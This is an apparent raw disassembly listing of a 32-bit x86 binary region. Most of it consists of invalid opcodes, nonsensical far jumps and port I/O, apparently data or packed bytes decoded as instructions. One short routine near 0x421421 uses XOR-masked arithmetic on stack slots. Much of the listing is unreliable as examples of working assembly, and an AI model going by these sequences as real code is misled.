  42118a:	sub    DWORD PTR [ecx],eax
  42118c:	sbb    eax,0x9f9c31eb
  421191:	lods   eax,DWORD PTR ds:[esi]
  421192:	gs sub al,0xa
  421195:	push   ebx
  421196:	loope  0x4211c7
  421198:	and    BYTE PTR [ecx-0x5d777237],bh
  42119e:	sbb    ecx,DWORD PTR [ecx]
  4211a0:	xchg   esi,eax
  4211a1:	lds    ebx,FWORD PTR [edx+ecx*1+0x11ebb13e]
  4211a8:	retf   0xc337
  4211ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ac:	(bad)  
  4211ad:	sbb    bh,bl
  4211af:	lock inc edx
  4211b1:	pop    esi
  4211b2:	mov    ebx,0x2784c8b1
  4211b7:	dec    edx
  4211b8:	lahf   
  4211b9:	in     eax,dx
  4211ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211bb:	pop    eax
  4211bc:	push   ds
  4211bd:	rol    BYTE PTR [eiz*1-0x3a650c56],1
  4211c4:	push   ss
  4211c5:	mov    edi,0xae01d3a0
  4211ca:	rcr    dh,1
  4211cc:	pop    ds
  4211cd:	into   
  4211ce:	or     bh,BYTE PTR [edx]
  4211d0:	xor    eax,0xd90b41d7
  4211d5:	inc    eax
  4211d6:	repz or BYTE PTR [esi-0x26],0x38
  4211db:	or     al,0xe8
  4211dd:	call   0x1d650a06
  4211e2:	outs   dx,DWORD PTR ds:[esi]
  4211e3:	jmp    0x3c439fcb
  4211e8:	or     esp,DWORD PTR [ebx]
  4211ea:	sub    al,0x58
  4211ec:	or     eax,0x19c0e8ab
  4211f1:	div    BYTE PTR [edx-0x72]
  4211f4:	stos   BYTE PTR es:[edi],al
  4211f5:	push   ss
  4211f6:	outs   dx,DWORD PTR ds:[esi]
  4211f7:	jmp    0x4211dd
  4211f9:	shl    esp,0xbd
  4211fc:	mov    eax,ds:0xe9f882bf
  421201:	mov    edi,0x3acd57aa
  421206:	dec    esi
  421207:	or     edi,DWORD PTR [edx-0x19]
  42120a:	xchg   ecx,eax
  42120b:	pop    eax
  42120c:	retf   0xd894
  42120f:	mov    esp,0xec749018
  421214:	repnz push 0xffffffa1
  421217:	cmp    DWORD PTR [eax],edx
  421219:	js     0x421276
  42121b:	imul   ecx,DWORD PTR [edx-0x4cca60d5],0xeb82c0c1
  421225:	push   ecx
  421226:	adc    ch,BYTE PTR [eax+ecx*1-0x3781b25]
  42122d:	adc    DWORD PTR [ebx-0x36470dfd],0x533a77be
  421237:	or     DWORD PTR [ecx],0x75ea76d9
  42123d:	in     al,dx
  42123e:	(bad)  
  42123f:	in     eax,0xb0
  421241:	push   eax
  421242:	test   BYTE PTR [eax+0x697a8832],al
  421248:	fcom   QWORD PTR [edx+0x41]
  42124b:	shl    esi,1
  42124d:	into   
  42124e:	dec    edx
  42124f:	or     eax,0x4e3cc268
  421254:	adc    BYTE PTR [ecx+0x6cd473f1],ah
  42125a:	call   0x89cd:0x191062ea
  421261:	pop    esp
  421262:	je     0x421242
  421264:	sbb    DWORD PTR [edi+0x4f],eax
  421267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421268:	xor    al,ah
  42126a:	pop    ecx
  42126b:	push   esi
  42126c:	iret   
  42126d:	iret   
  42126e:	ret    
  42126f:	(bad)  
  421270:	es add al,ch
  421273:	and    dl,dh
  421275:	std    
  421276:	push   ds
  421277:	jae    0x42129a
  421279:	jge    0x421295
  42127b:	sbb    edi,0x6fdcdb6a
  421281:	push   edi
  421282:	sub    edi,0xffffffa5
  421285:	out    dx,al
  421286:	cmp    ebp,esp
  421288:	jmp    0x421283
  42128a:	dec    edi
  42128b:	popa   
  42128c:	and    al,0x3d
  42128e:	sbb    ebx,edi
  421290:	shl    ebp,cl
  421292:	dec    eax
  421293:	loope  0x421258
  421295:	sahf   
  421296:	mov    bh,0x9
  421298:	dec    ebp
  421299:	and    al,0xbf
  42129b:	dec    edx
  42129c:	inc    eax
  42129d:	pop    edx
  42129e:	out    dx,al
  42129f:	mov    ds:0xc9b7a542,eax
  4212a4:	xchg   ebp,eax
  4212a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212a6:	fbstp  TBYTE PTR [ecx+0xb]
  4212a9:	arpl   WORD PTR [esi],bp
  4212ab:	call   0x8d6e:0x91d0536f
  4212b2:	scas   al,BYTE PTR es:[edi]
  4212b3:	push   es
  4212b4:	aas    
  4212b5:	mov    edx,0x347bfb6c
  4212ba:	dec    ecx
  4212bb:	sub    eax,esi
  4212bd:	push   ss
  4212be:	jecxz  0x4212de
  4212c0:	mov    esi,0x3cbaaa27
  4212c5:	sub    al,0x75
  4212c7:	sub    DWORD PTR [ebx+0x24ae17a6],0x1cf74469
  4212d1:	pop    edi
  4212d3:	rcl    DWORD PTR [ebp+0x6097cd94],1
  4212d9:	es jns 0x421347
  4212dc:	pop    esi
  4212dd:	cmp    DWORD PTR [edx+0x620574ea],eax
  4212e3:	mov    ds:0x13f8b193,al
  4212e8:	inc    edx
  4212e9:	mov    esp,0x82cd87b1
  4212ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212ef:	jmp    0x4212a5
  4212f1:	je     0x42130a
  4212f3:	shl    BYTE PTR [ecx+0x425e456e],1
  4212f9:	ins    DWORD PTR es:[edi],dx
  4212fa:	shr    ch,0xf2
  4212fd:	out    dx,eax
  4212fe:	pop    ss
  4212ff:	outs   dx,BYTE PTR ds:[esi]
  421300:	jb     0x4212a9
  421302:	sub    bh,0xb4
  421305:	push   eax
  421306:	stc    
  421307:	jno    0x4212dd
  421309:	push   0xffffffca
  42130b:	pop    ecx
  42130c:	push   es
  42130d:	sub    al,0x73
  42130f:	jnp    0x42132b
  421311:	scas   eax,DWORD PTR es:[edi]
  421312:	jae    0x4212fb
  421314:	mov    al,ds:0x7b319bc0
  421319:	dec    ecx
  42131a:	aam    0x6e
  42131c:	xor    esp,DWORD PTR [eax]
  42131e:	repnz push ds
  421320:	dec    ebx
  421321:	stc    
  421322:	out    0xaa,eax
  421324:	cmp    al,0x13
  421326:	xor    DWORD PTR [ecx+eiz*1],ecx
  421329:	mov    dl,0x9c
  42132b:	mov    ds:0xca5c7580,eax
  421330:	sub    al,0x6c
  421332:	cmp    eax,0xea22c7b3
  421337:	ja     0x421326
  421339:	test   DWORD PTR [edx],ebx
  42133b:	jmp    0x4213ac
  42133d:	test   BYTE PTR [ebp-0x11],ch
  421340:	cmp    ch,al
  421342:	in     al,0xd0
  421344:	loope  0x421373
  421346:	pop    ebp
  421347:	ins    DWORD PTR es:[edi],dx
  421348:	mov    ah,0xcb
  42134a:	test   ebp,ebp
  42134c:	mov    al,ds:0xb9aa96a3
  421351:	add    al,BYTE PTR [eax+ebx*4-0x6a]
  421355:	add    dl,BYTE PTR [ecx-0x37]
  421358:	xchg   edx,eax
  421359:	arpl   ax,sp
  42135b:	push   ebp
  42135c:	push   0xffffff9b
  42135e:	inc    ecx
  42135f:	dec    ebx
  421360:	test   al,0x11
  421363:	mov    esp,0xa8c236bb
  421368:	out    0xaf,eax
  42136a:	cmc    
  42136b:	les    esi,FWORD PTR [ebx+ebx*8-0x16e17b18]
  421372:	outs   dx,BYTE PTR ds:[esi]
  421373:	push   0xed57f688
  421378:	dec    edi
  421379:	sahf   
  42137a:	or     eax,0xf52765d0
  42137f:	adc    edx,DWORD PTR [ecx+0x53f54c4b]
  421385:	or     bl,BYTE PTR [edi+edx*1+0x7]
  421389:	mov    ebp,0xb6e31433
  42138e:	sbb    dl,al
  421390:	xor    BYTE PTR [edx+0x23b85e2e],bl
  421396:	mov    esi,0x4a561489
  42139b:	ret    0xd8ae
  42139e:	pop    ebp
  42139f:	inc    edx
  4213a0:	ds jae 0x421363
  4213a3:	and    al,0x4c
  4213a5:	mov    ebx,0x44b329c3
  4213aa:	fsubr  DWORD PTR [eax+0xd]
  4213ad:	push   ebp
  4213ae:	dec    esp
  4213af:	or     dh,BYTE PTR [ecx]
  4213b1:	or     DWORD PTR [esi],ebx
  4213b3:	mov    eax,0x6309634b
  4213b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213b9:	outs   dx,DWORD PTR ds:[esi]
  4213ba:	xchg   DWORD PTR [edi+0x2c],ebx
  4213bd:	pushf  
  4213be:	add    al,0x25
  4213c0:	jbe    0x421411
  4213c2:	xchg   edi,eax
  4213c3:	ds mov edi,0xc848b3ca
  4213c9:	and    BYTE PTR [ecx],bh
  4213cb:	fcmovnbe st,st(0)
  4213cd:	adc    DWORD PTR [esi-0x1a],ecx
  4213d0:	dec    edx
  4213d1:	aam    0x2
  4213d3:	inc    edi
  4213d4:	pop    edx
  4213d5:	cmp    esi,esi
  4213d7:	retf   0x198c
  4213da:	clc    
  4213db:	lea    esi,[ebx+0x1b]
  4213de:	in     al,0xbf
  4213e0:	jb     0x4213b8
  4213e2:	clc    
  4213e3:	xchg   esi,eax
  4213e4:	fst    QWORD PTR gs:[esp+eiz*4+0x32]
  4213e9:	inc    eax
  4213ea:	sti    
  4213eb:	sub    edi,DWORD PTR [edi+0x7c]
  4213ee:	and    eax,0x662d4306
  4213f3:	adc    eax,0xd5c18259
  4213f8:	cmp    dh,BYTE PTR [ebx+0x12]
  4213fb:	jbe    0x42144a
  4213fd:	inc    esi
  4213fe:	xchg   BYTE PTR [edx+0x2],al
  421401:	cwde   
  421402:	lea    edi,[esi-0x63]
  421405:	call   0xb77d:0x232bf80c
  42140c:	xor    bl,dh
  42140e:	jno    0x42139b
  421410:	dec    ebp
  421411:	or     BYTE PTR [ebx],dh
  421413:	enter  0xce03,0xf
  421417:	test   DWORD PTR [ebx-0x24],esp
  42141a:	(bad)  
  42141b:	(bad)  
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xb10288e2
  42147c:	or     al,0xa4
  42147e:	ja     0x42144d
  421480:	add    DWORD PTR [eax],eax
  421482:	bound  eax,QWORD PTR [eax]
  421484:	add    BYTE PTR [eax],al
  421486:	mov    dh,0x47
  421488:	pop    eax
  421489:	pop    esi
  42148a:	jbe    0x42148a
  42148c:	fsub   st,st(4)
  42148e:	jns    0x4214d7
  421490:	push   edi
  421491:	call   0x1efd:0x51187af0
  421498:	jg     0x4214e3
  42149a:	(bad)  
  42149b:	(bad)  
  42149c:	mov    esi,0xfbe3ede4
  4214a1:	ficomp DWORD PTR [ecx]
  4214a3:	imul   edx,DWORD PTR [edi+esi*8],0x4b15eb96
  4214aa:	es push edx
  4214ac:	aam    0x33
  4214ae:	push   cs
  4214af:	rol    BYTE PTR [ecx-0x59],0x26
  4214b3:	push   0x58
  4214b5:	xchg   esi,eax
  4214b6:	nop
  4214b7:	sbb    al,bh
  4214b9:	inc    eax
  4214ba:	or     edi,DWORD PTR [edx-0x95b61c9]
  4214c0:	test   eax,0x93cd0116
  4214c5:	xchg   ebp,eax
  4214c6:	repz out 0xd0,al
  4214c9:	sbb    BYTE PTR ds:0x38322ddb,ch
  4214cf:	iret   
  4214d0:	cmc    
  4214d1:	pop    esi
  4214d2:	mov    dl,0xcd
  4214d4:	push   0x40
  4214d6:	mov    esp,0x436a2827
  4214db:	jle    0x421504
  4214dd:	das    
  4214de:	std    
  4214df:	sub    esi,ebx
  4214e1:	(bad)  
  4214e3:	adc    eax,0x43fdacbb
  4214e8:	add    BYTE PTR [eax],al
  4214ea:	add    BYTE PTR [eax],al
  4214ec:	add    BYTE PTR [eax],al
  4214ee:	shr    DWORD PTR [esp+edx*1],1
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0xcb111af
  4214fe:	fxch   st(5)
  421500:	add    DWORD PTR [eax],eax
  421502:	bound  eax,QWORD PTR [eax]
  421504:	add    BYTE PTR [eax],al
  421506:	mov    si,WORD PTR [esi-0x25]
  42150a:	loop   0x421514
  42150c:	mov    ah,0xd9
  42150e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42150f:	xor    BYTE PTR [edx+0x6a],al
  421512:	sub    ebx,edx
  421514:	sub    al,0xea
  421516:	in     eax,dx
  421517:	imul   edi,esi,0xffffffe0
  42151a:	push   ds
  42151b:	inc    esi
  42151c:	jmp    0xc4fcb802
  421521:	push   ds
  421522:	(bad)  
  421523:	mov    bl,0x8f
  421525:	stos   DWORD PTR es:[edi],eax
  421526:	loop   0x421538
  421528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421529:	les    ebp,FWORD PTR [ecx]
  42152b:	xchg   ecx,eax
  42152c:	das    
  42152d:	out    dx,al
  42152e:	mov    ebp,cs
  421530:	jno    0x4214ef
  421532:	iret   
  421533:	loop   0x4214d3
  421535:	jecxz  0x421536
  421537:	shr    DWORD PTR [esi+edi*8-0x57],0xbe
  42153c:	mov    bh,0x52
  42153e:	add    al,0xd8
  421540:	sbb    DWORD PTR [ecx-0x43],ebp
  421543:	call   0x768b53af
  421548:	sub    ch,BYTE PTR [eax-0x5d]
  42154b:	pop    ss
  42154c:	jp     0x4215a8
  42154e:	ins    DWORD PTR es:[edi],dx
  42154f:	je     0x4215c4
  421551:	jns    0x421527
  421553:	xor    ebp,esi
  421555:	adc    eax,0xa2d1387f
  42155a:	adc    dh,bl
  42155c:	pop    ds
  42155d:	jno    0x4215ba
  42155f:	push   ss
  421560:	mov    edi,0x49a18400
  421565:	retf   
  421566:	sar    DWORD PTR [eax+eax*1],cl
  421569:	add    BYTE PTR [eax],al
  42156b:	add    BYTE PTR [eax],al
  42156d:	add    BYTE PTR [edi],bl
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2-0xb2bb7f8],0x3b
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	bound  eax,QWORD PTR [eax]
  421584:	add    BYTE PTR [eax],al
  421586:	aad    0xc5
  421588:	pop    ebp
  421589:	xchg   edx,eax
  42158a:	pop    esp
  42158b:	sahf   
  42158c:	out    0xde,al
  42158e:	mov    ch,0x17
  421590:	lea    esi,[ebx-0x4b9d7104]
  421596:	(bad)  
  421597:	xor    eax,0xbcdf6082
  42159c:	in     eax,dx
  42159d:	xchg   esi,eax
  42159e:	xchg   ebx,eax
  42159f:	shl    DWORD PTR [esi],cl
  4215a1:	cmp    ebx,ebp
  4215a3:	lods   eax,DWORD PTR ds:[esi]
  4215a4:	cmp    edx,DWORD PTR [ecx+0x3b2c8e56]
  4215aa:	in     eax,0xe0
  4215ac:	sbb    DWORD PTR [ecx],ecx
  4215ae:	(bad)  
  4215af:	leave  
  4215b0:	and    dl,BYTE PTR [ecx]
  4215b2:	aam    0xee
  4215b4:	scas   eax,DWORD PTR es:[edi]
  4215b5:	enter  0x661a,0x7f
  4215b9:	or     ch,BYTE PTR ds:0x34f8d8a1
  4215bf:	inc    ebx
  4215c0:	fs push 0xc95f059d
  4215c6:	fcom   QWORD PTR [edi-0x2f]
  4215c9:	add    edi,esp
  4215cb:	pop    eax
  4215cc:	add    BYTE PTR [ebp+ecx*2+0x12603f25],0xa3
  4215d4:	xor    DWORD PTR [ebx+0x633a6e2f],esp
  4215da:	call   0xb5faea4b
  4215df:	call   0x6c893b49
  4215e4:	test   ecx,esi
  4215e6:	add    al,0xfb
  4215e8:	add    BYTE PTR [eax],al
  4215ea:	add    BYTE PTR [eax],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	das    
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	jge    0x421605
  4215fc:	daa    
  4215fd:	mov    DWORD PTR [ebp+0x620001ce],ebx
  421603:	add    BYTE PTR [eax],al
  421605:	add    BYTE PTR [eax+edx*2-0x54],ch
  421609:	dec    esp
  42160a:	push   ecx
  42160b:	cmp    eax,0x7a15481d
  421610:	adc    DWORD PTR [esi-0x5462337e],ebx
  421616:	cmp    ah,al
  421618:	stc    
  421619:	in     eax,dx
  42161a:	jecxz  0x4215b7
  42161c:	sbb    eax,DWORD PTR [ecx]
  42161e:	jae    0x4215bf
  421620:	push   cs
  421621:	jmp    0x459f:0xe4a42be1
  421628:	push   cs
  421629:	jmp    FWORD PTR [ebp+eax*2-0x2ef6657f]
  421630:	iret   
  421631:	dec    esp
  421632:	adc    DWORD PTR [ecx+0x47],0x879d09a9
  421639:	adc    DWORD PTR [edx],esp
  42163b:	(bad)  
  42163c:	(bad)  
  42163d:	mov    ecx,0xfd70baf4
  421642:	std    
  421643:	test   al,0x24
  421645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421646:	lods   al,BYTE PTR ds:[esi]
  421647:	pop    ebx
  421648:	jae    0x4215fc
  42164a:	sbb    DWORD PTR [edi-0x17],edx
  42164d:	addr16 push esi
  42164f:	das    
  421650:	xchg   BYTE PTR ds:0xf7864d1f,bl
  421656:	test   eax,esp
  421658:	stc    
  421659:	sbb    esp,DWORD PTR [edx]
  42165b:	sahf   
  42165c:	mov    dh,0x2b
  42165e:	mov    edi,0xbde1fc5e
  421663:	scas   al,BYTE PTR es:[edi]
  421664:	lea    esi,[edi+0x5f]
  421667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421668:	add    BYTE PTR [eax],al
  42166a:	add    BYTE PTR [eax],al
  42166c:	add    BYTE PTR [eax],al
  42166e:	retf   0x76a0
  421671:	dec    ebp
  421672:	jle    0x421653
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0x96f4ab44,al
  42167e:	dec    esi
  421680:	add    DWORD PTR [eax],eax
  421682:	bound  eax,QWORD PTR [eax]
  421684:	add    BYTE PTR [eax],al
  421686:	data16 and bl,BYTE PTR [eax+0x5c23a595]
  42168d:	or     dh,0xc4
  421690:	sbb    BYTE PTR [esi+0x1eb105e0],bl
  421696:	and    ch,al
  421698:	out    0x96,eax
  42169a:	push   ecx
  42169b:	ss inc ecx
  42169d:	cmc    
  42169e:	dec    ebp
  42169f:	xchg   edi,eax
  4216a0:	xchg   ebp,eax
  4216a1:	xor    DWORD PTR [ecx+0x2e4eaf5d],0x6746d1b8
  4216ab:	loopne 0x4216c4
  4216ad:	stos   BYTE PTR es:[edi],al
  4216ae:	dec    esi
  4216af:	mov    ch,al
  4216b1:	neg    DWORD PTR [esi-0x49]
  4216b4:	les    ecx,FWORD PTR [edx]
  4216b6:	dec    edi
  4216b7:	leave  
  4216b8:	icebp  
  4216b9:	add    DWORD PTR [ebx-0x2e],edi
  4216bc:	cdq    
  4216bd:	in     eax,dx
  4216be:	dec    ecx
  4216bf:	repz sbb ch,BYTE PTR [edx+0x7a32e46d]
  4216c6:	dec    eax
  4216c7:	dec    eax
  4216c8:	push   ss
  4216c9:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4216cb:	lods   al,BYTE PTR ds:[esi]
  4216cc:	test   al,0x63
  4216ce:	icebp  
  4216cf:	aaa    
  4216d0:	sub    DWORD PTR [edi],esi
  4216d2:	add    dl,BYTE PTR [eax-0x2201c74]
  4216d8:	mov    esi,0x75a43dcb
  4216dd:	adc    BYTE PTR [ebx-0x53],al
  4216e0:	push   ebp
  4216e1:	test   DWORD PTR [ebx],esp
  4216e3:	imul   esi,DWORD PTR [edx],0x371b02
  4216e9:	add    BYTE PTR [eax],al
  4216eb:	add    BYTE PTR [eax],al
  4216ed:	add    dh,al
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	daa    
  4216fb:	sbb    al,BYTE PTR [edx+0x1cf61c2]
  421701:	add    BYTE PTR [edx+0x0],ah
  421704:	add    BYTE PTR [eax],al
  421706:	xchg   edx,eax
  421707:	xlat   BYTE PTR ds:[ebx]
  421708:	push   ss
  421709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42170a:	adc    eax,0xcbec2528
  42170f:	adc    BYTE PTR [ebp-0x60],bl
  421712:	pop    esi
  421713:	push   edx
  421714:	mov    ds:0x9b5f5be5,eax
  421719:	lods   al,BYTE PTR ds:[esi]
  42171a:	pusha  
  42171b:	inc    esp
  42171c:	and    eax,0x51d289b3
  421721:	xlat   BYTE PTR ds:[ebx]
  421722:	sbb    eax,0x75157a1c
  421727:	pop    esp
  421728:	sbb    eax,0x17ebe2cb
  42172d:	iret   
  42172e:	add    ebx,DWORD PTR [esi-0x2be37409]
  421734:	test   eax,0xa5c90734
  421739:	mov    DWORD PTR [esi+0x200191d5],ebx
  42173f:	jne    0x42171c
  421741:	cmp    DWORD PTR [esi+eax*2+0x3bd255f7],edi
  421748:	imul   esi,DWORD PTR [esi-0x30e24514],0x1b318cd7
  421752:	in     al,0xa3
  421754:	sbb    ch,BYTE PTR [ebp+0x1bb7ba84]
  42175a:	aas    
  42175b:	not    DWORD PTR [ebp-0x6a39255]
  421761:	xor    ch,BYTE PTR [edx+0x2ba1b4c0]
  421767:	jae    0x421769
  421769:	add    BYTE PTR [eax],al
  42176b:	add    BYTE PTR [eax],al
  42176d:	add    BYTE PTR [edx+0x34],dl
  421770:	inc    eax
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0xb76a4e09
  42177b:	xor    eax,DWORD PTR [eax-0x80]
  42177e:	ret    
  42177f:	iret   
  421780:	add    DWORD PTR [eax],eax
  421782:	bound  eax,QWORD PTR [eax]
  421784:	add    BYTE PTR [eax],al
  421786:	sub    bh,ah
  421788:	adc    dl,dl
  42178a:	pushf  
  42178b:	in     eax,dx
  42178c:	ret    0x35ad
  42178f:	and    al,0x12
  421791:	and    al,0xa9
  421794:	cwde   
  421795:	(bad)  
  421796:	in     al,dx
  421797:	push   ss
  421798:	mov    bl,0xb9
  42179a:	sar    ebx,cl
  42179c:	jle    0x4217fb
  42179e:	idiv   edx
  4217a0:	retf   0xdaf
  4217a3:	or     ebx,0x7db4040e
  4217a9:	mov    al,ds:0x2461e708
  4217ae:	clc    
  4217af:	add    bl,BYTE PTR [ebp+0x79]
  4217b2:	fmulp  st(6),st
  4217b4:	jecxz  0x4217bf
  4217b6:	(bad)  
  4217b7:	sbb    ebp,ecx
  4217b9:	jmp    0x42178e
  4217bb:	mov    dl,0xd5
  4217bd:	stc    
  4217be:	cdq    
  4217bf:	or     al,0x88
  4217c1:	pop    es
  4217c2:	pop    es
  4217c3:	test   DWORD PTR [esi],eax
  4217c5:	mov    BYTE PTR [esi+0x55434996],al
  4217cb:	adc    BYTE PTR [ecx-0x2f],ah
  4217ce:	xchg   DWORD PTR ds:0x4b474b98,eax
  4217d4:	pop    edi
  4217d5:	test   DWORD PTR [edx+0x13c79f40],ebx
  4217db:	pop    ss
  4217dc:	pcmpgtd mm1,QWORD PTR [ebx-0xc]
  4217e0:	mov    bh,BYTE PTR [eax+0x3d]
  4217e3:	pop    esp
  4217e4:	sbb    ebx,DWORD PTR [ebp+ebx*4-0x48]
  4217e8:	add    BYTE PTR [eax],al
  4217ea:	add    BYTE PTR [eax],al
  4217ec:	add    BYTE PTR [eax],al
  4217ee:	dec    ecx
  4217ef:	inc    esi
  4217f0:	sub    BYTE PTR [eax],dh
  4217f2:	das    
  4217f3:	jle    0x42184e
  4217f5:	jg     0x4217bd
  4217f7:	imul   esi,eax,0xffffffd5
  4217fa:	or     edi,DWORD PTR [eax+0x33]
  4217fd:	push   0xffffffe7
  4217ff:	loop   0x421802
  421801:	add    BYTE PTR [edx+0x0],ah
  421804:	add    BYTE PTR [eax],al
  421806:	dec    esi
  421807:	adc    ah,al
  421809:	pop    edx
  42180a:	imul   ecx,DWORD PTR [eax+0x5682c0cc],0x3f
  421811:	adc    al,0x1a
  421813:	call   0x261ce586
  421818:	scas   al,BYTE PTR es:[edi]
  421819:	int    0xa
  42181b:	add    eax,DWORD PTR [edi]
  42181d:	fisttp DWORD PTR [esi-0x41c0b0b0]
  421823:	pop    ebp
  421824:	retf   0x2646
  421827:	mul    BYTE PTR [edx+0x67c96f77]
  42182d:	mov    ebx,0x4b1b6591
  421832:	es mov edi,0x6cd749b8
  421838:	or     esi,esp
  42183a:	scas   al,BYTE PTR es:[edi]
  42183b:	sbb    al,0x6a
  42183d:	loope  0x421899
  42183f:	(bad)  
  421840:	les    ecx,FWORD PTR [ecx+0x5e83a0f4]
  421846:	and    ebp,DWORD PTR es:[esi-0x25a29853]
  42184d:	and    bh,0xb5
  421850:	out    0x1,eax
  421852:	add    al,0x1d
  421854:	pop    ds
  421855:	shr    cl,1
  421857:	inc    DWORD PTR [edx]
  421859:	int    0x94
  42185b:	mov    edi,0x45f78108
  421860:	sbb    eax,0x9b496fd3
  421865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421866:	nop
  421867:	add    BYTE PTR gs:[eax],al
  42186a:	add    BYTE PTR [eax],al
  42186c:	add    BYTE PTR [eax],al
  42186e:	addr16 (bad) 
  421870:	and    dh,dh
  421872:	mov    eax,ds:0xe7d7f7f6
  421877:	mov    eax,0x3418da72
  42187c:	mov    eax,fs
  42187e:	dec    ecx
  42187f:	jecxz  0x421882
  421881:	add    BYTE PTR [edx+0x0],ah
  421884:	add    BYTE PTR [eax],al
  421886:	mov    al,0x12
  421888:	rcr    DWORD PTR [esi-0x79],0xd3
  42188c:	ror    cl,1
  42188e:	mov    BYTE PTR ds:[ebx],ah
  421891:	aaa    
  421892:	mov    bl,0x28
  421894:	cmp    dh,BYTE PTR ds:0xcab819e9
  42189a:	dec    ebp
  42189b:	dec    edi
  42189c:	add    bh,BYTE PTR [eax]
  42189e:	sub    al,0xca
  4218a0:	fnstcw WORD PTR [ecx-0x7a62f9e7]
  4218a6:	jne    0x421839
  4218a8:	mov    WORD PTR [edi-0x3e42a5b4],?
  4218ae:	xor    al,0xe4
  4218b0:	rcr    BYTE PTR [edi-0x16],0x59
  4218b4:	jl     0x42186e
  4218b6:	jne    0x42186b
  4218b8:	sahf   
  4218b9:	and    bh,0xf3
  4218bc:	push   ecx
  4218bd:	fidiv  DWORD PTR [eax-0x57]
  4218c0:	pop    edi
  4218c1:	and    BYTE PTR [edx+0x4a],dh
  4218c4:	xor    eax,esp
  4218c6:	dec    esp
  4218c7:	in     eax,dx
  4218c8:	loop   0x421904
  4218ca:	jle    0x4218d9
  4218cc:	adc    edx,ebx
  4218ce:	sbb    BYTE PTR [edi],al
  4218d0:	xchg   ebx,eax
  4218d1:	scas   eax,DWORD PTR es:[edi]
  4218d2:	xor    BYTE PTR [edi+0x4b],dh
  4218d5:	lea    esp,[ecx-0x3d9e318]
  4218db:	inc    ebx
  4218dc:	dec    cx
  4218de:	nop
  4218df:	loope  0x4218d9
  4218e1:	repz stc 
  4218e3:	ds xor eax,0xfd7685
  4218e9:	add    BYTE PTR [eax],al
  4218eb:	add    BYTE PTR [eax],al
  4218ed:	add    bl,al
  4218ef:	or     eax,0xefee66a6
  4218f4:	ret    
  4218f5:	lods   eax,DWORD PTR ds:[esi]
  4218f6:	sub    al,0xb8
  4218f8:	mov    ds:0xb0d4c247,eax
  4218fd:	mov    edi,0x1e3ab
  421902:	bound  eax,QWORD PTR [eax]
  421904:	add    BYTE PTR [eax],al
  421906:	xchg   ebx,eax
  421907:	jg     0x4218de
  421909:	les    edi,FWORD PTR [ecx-0x66cf3c2f]
  42190f:	push   edx
  421910:	div    BYTE PTR [esi-0x56]
  421913:	in     eax,0x36
  421915:	call   0x32b95ee5
  42191a:	mov    bl,0xae
  42191c:	mov    ds:0xdf23953e,al
  421921:	add    al,0x45
  421923:	in     al,0x1b
  421925:	std    
  421926:	mov    ds:0x44d9768,eax
  42192b:	jns    0x421959
  42192d:	enter  0x87de,0xfd
  421931:	sbb    al,0xcb
  421933:	push   es
  421934:	add    BYTE PTR fs:[ecx-0x505ee124],dh
  42193b:	cmp    eax,0x389d0fcf
  421940:	xchg   edx,eax
  421941:	es pop eax
  421943:	pop    esp
  421944:	or     esi,DWORD PTR [edi-0x387dc47]
  42194a:	ja     0x42199e
  42194c:	aad    0x1e
  42194e:	sbb    eax,0xe2ba401f
  421953:	jp     0x4219aa
  421955:	xchg   DWORD PTR [edx+0x63254325],esp
